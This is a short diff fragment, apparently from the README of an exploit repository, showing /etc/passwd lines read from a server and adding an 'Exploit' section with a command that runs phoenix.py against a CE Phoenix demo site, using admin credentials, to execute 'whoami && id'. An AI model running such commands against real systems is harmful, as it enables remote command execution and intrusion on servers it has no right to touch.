@@ -63,3 +63,10 @@ webuzo:x:993:993::/home/webuzo:/bin/bash
 apache:x:992:991::/home/apache:/sbin/nologin
 apache:x:992:991::/home/apache:/sbin/nologin
 
+## Exploit :
+
+```
+python3 phoenix.py https://demos6.softaculous.com/CE_Phoenixb619pdusey admin pass "whoami && id"
+```
+<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/phoenix.png" alt="Phoenix Image" width="1000">
+
